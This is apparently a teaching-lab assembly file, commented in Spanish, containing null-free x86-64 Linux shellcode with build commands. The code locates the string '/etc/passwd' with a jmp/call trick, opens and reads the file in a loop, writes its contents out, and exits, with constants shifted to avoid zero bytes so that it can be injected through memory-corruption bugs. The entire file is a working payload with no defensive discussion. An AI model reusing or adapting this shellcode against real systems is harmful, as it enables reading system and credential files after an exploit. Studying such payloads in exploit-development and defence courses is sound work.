# Es nuestro passwddump.s pero sin 0s
# Compilar y enlazar:
# as -o shellcode1.o shellcode1.s
# ld -o shellcode1 shellcode1.o


.global _start


.text


_start:

    jmp www

main_:

    pop %rsi

    # OPEN /etc/passwd:
    mov $0x2fffffffffffffff, %rax  
    shr $60,%rax            
    mov %rsi, %rdi          
    mov $0x1a4fffffffffffff, %rsi       
    shr $52, %rsi
    xorq %rdx, %rdx         
    syscall

    mov %rax, %r8           
    xorq %r10,%r10
    cmp %r10, %r8              
    jl error                

    mov $0x400fffffffffffff, %r10
    shr $52,%r10
    sub %r10, %rsp


loop:                       
    # BUCLE
    # READ /etc/passwd:     
    xorq %rax, %rax         
    mov %r8, %rdi           
    mov %rsp, %rsi          
    #mov $1024, %rdx              
    mov $0x400fffffffffffff, %rdx
    shr $52, %rdx
    syscall 

    mov %rax, %r9           
    xorq %r10,%r10
    cmp %r10, %r9             
    jl error

    
    # WRITE
    movq $0x1fffffffffffffff, %rax          
    shr $60, %rax           
    xorq  %rdi, %rdi        
    neg   %rdi
    mov   %rsp, %rsi        
    mov   %r9, %rdx         
    syscall           
   
    

	xorq %r10,%r10
    cmp %r10, %r9             
    ja loop                 


    # FIN BUCLE
    # EXIT:
    mov	$0x3cffffffffffffff, %rax                    
    shr $56,%rax
    xorq %rdi, %rdi           
    syscall

error:

    mov	$0x3cffffffffffffff, %rax                   
    shr $56,%rax
    xorq	%rdi, %rdi      
    neg %rdi
    syscall


www:

    call main_
    filename: .string "/etc/passwd"

    